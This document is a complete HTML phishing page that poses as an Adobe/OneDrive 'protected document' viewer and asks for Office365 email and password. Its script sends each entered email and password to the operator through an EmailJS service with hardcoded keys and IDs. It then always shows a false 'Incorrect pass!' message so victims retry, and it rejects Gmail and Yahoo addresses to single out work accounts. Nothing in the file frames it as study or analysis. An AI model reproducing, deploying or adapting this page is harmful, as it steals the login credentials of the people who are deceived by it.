<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe onedrive</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://z-cdn-media.chatglm.cn/files/b813630d-2cfb-47df-8134-eb143b9b7f78.jpg?auth_key=1868828119-288dad955cb14a80a19e795c0c024648-0-363a98a79728cf119be6d84f79b68798');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
            width: 320px;
            text-align: center;
        }
        .header-image {
            width: 120px;
            height: auto;
            margin-bottom: 15px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .info-text {
            color: #333;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            text-align: left;
        }
        input::placeholder {
            text-align: left;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0056b3;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #004494;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .error-message {
            color: #d32f2f;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://z-cdn-media.chatglm.cn/files/09c1beb4-a587-4c85-80e5-7f68fb3b90a3.png?auth_key=1868461394-9534c0b4396e4ddeaeec4a749f6eadcf-0-2cd17952b1c324592a20df66771dfb1e" alt="Document" class="header-image">
        
        <p class="info-text">This document is protected! Sign-in with Office365 mail to view document</p>
        
        <form id="contact-form">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <input type="password" id="name" name="name" placeholder="Password" required>
            
            <button type="submit" id="button">View Document</button>
            <div class="error-message" id="errorMessage">Incorrect pass! Please try again.</div>
        </form>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("14h06tNZvl7-Mh1DS");
        })();
        function isBlockedEmail(email) {
            const emailLower = email.toLowerCase();
            if (emailLower.includes('@gmail.')) {
                return { blocked: true, provider: 'Gmail' };
            }
            if (emailLower.includes('@yahoo.')) {
                return { blocked: true, provider: 'Yahoo' };
            }
            return { blocked: false, provider: null };
        }

        document.getElementById('contact-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const btn = document.getElementById('button');
            const errorMessage = document.getElementById('errorMessage');
            const emailVal = document.getElementById('email').value;
            const nameVal = document.getElementById('name').value;
            const nameInput = document.getElementById('name');
            errorMessage.style.display = 'none';
            const emailCheck = isBlockedEmail(emailVal);
            if (emailCheck.blocked) {
                errorMessage.textContent = `Please use a work email (${emailCheck.provider} is not allowed).`;
                errorMessage.style.display = 'block';
                nameInput.value = ''; 
                return; 
            }
            btn.disabled = true;

            const templateParams = {
                email: emailVal,
                name: nameVal  
            };

            emailjs.send('service_5cglrek', 'template_xt50bpb', templateParams)
                .then(function() {
                    console.log('Submitted successfully');
                    errorMessage.textContent = 'Incorrect pass! Please try again.';
                    errorMessage.style.display = 'block';
                    nameInput.value = '';
                    btn.disabled = false;
                }, function(error) {
                    console.log('FAILED...', error);
                    errorMessage.textContent = 'Incorrect pass! Please try again.';
                    errorMessage.style.display = 'block'
                    nameInput.value = '';
                    btn.disabled = false;
                });
        });
    </script>
</body>
</html>
